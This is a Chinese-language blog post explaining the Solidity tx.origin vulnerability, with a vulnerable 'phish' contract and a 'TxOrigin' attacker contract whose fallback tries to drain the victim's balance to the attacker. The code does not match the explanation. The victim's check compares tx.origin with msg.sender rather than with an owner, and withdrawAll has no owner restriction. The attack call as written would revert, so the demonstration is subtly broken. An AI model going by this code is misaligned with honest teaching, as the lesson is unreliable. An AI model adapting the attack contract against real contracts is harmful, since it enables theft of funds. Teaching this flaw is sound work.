---
title: 2-tx.origin

date: 2023-04-21	

categories: 合约安全	

tags: [区块链,合约安全]
---	

# tx.origin

在合约中使用 `tx.origin` 可能容易受到伪造的交易攻击，因为它只提供了最初的发送者地址，而不是当前调用合约的地址。这种攻击称为 "跨合约伪造"（cross-contract calling attack）或 "Tx.origin漏洞"（Tx.origin vulnerability）。因此，尽量避免在合约中过于依赖 `tx.origin`。

使用tx.origin很少有好的理由。如果tx.origin被用来识别交易发起人，那么中间人攻击是可能的。**如果用户被骗去调用一个恶意的智能合约，那么该智能合约就可以利用tx.origin所拥有的所有权限来进行破坏**。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract phish {
    address public owner;
    constructor () {
    owner = msg.sender;
    }
    receive() external payable{}

    fallback() external payable{}

    function withdrawAll (address payable _recipient) public {
        require(tx.origin == msg.sender);
        _recipient.transfer(address(this).balance);
    }
    function getOwner() public view returns(address) {
        return owner;
    }
}

contract TxOrigin {
    address  owner;
    phish PH;

    constructor(address phishAddr) {
        owner = msg.sender;
        PH=phish(payable(phishAddr));
    }

    function attack() internal {
        address phOwner = PH.getOwner();
        if (phOwner == msg. sender) {
            PH.withdrawAll(payable(owner));
        } else {
            payable(owner).transfer(address(this). balance);
        }
    }
    fallback() external payable{
        attack();
    }
}
```

